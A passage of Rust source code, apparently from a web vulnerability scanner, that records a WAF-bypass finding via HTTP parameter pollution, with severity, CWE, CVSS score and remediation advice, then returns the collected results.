                                vuln_type: "WAF Bypass via HTTP Parameter Pollution".to_string(),
                                severity: Severity::High,
                                confidence: Confidence::High,
                                category: "WAF Bypass".to_string(),
                                url: test_url.clone(),
                                parameter: None,
                                payload: params.to_string(),
                                description: format!(
                                    "WAF bypass achieved using {}. The WAF inspected parameters differently than the backend server.",
                                    technique
                                ),
                                evidence: Some("Split payload was concatenated by backend".to_string()),
                                cwe: "CWE-235".to_string(),
                                cvss: 8.1,
                                verified: true,
                                false_positive: false,
                                remediation: "1. Normalize parameters before WAF inspection\n2. Use same parsing logic as backend\n3. Reject duplicate parameters".to_string(),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                            });
                        }
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }
}
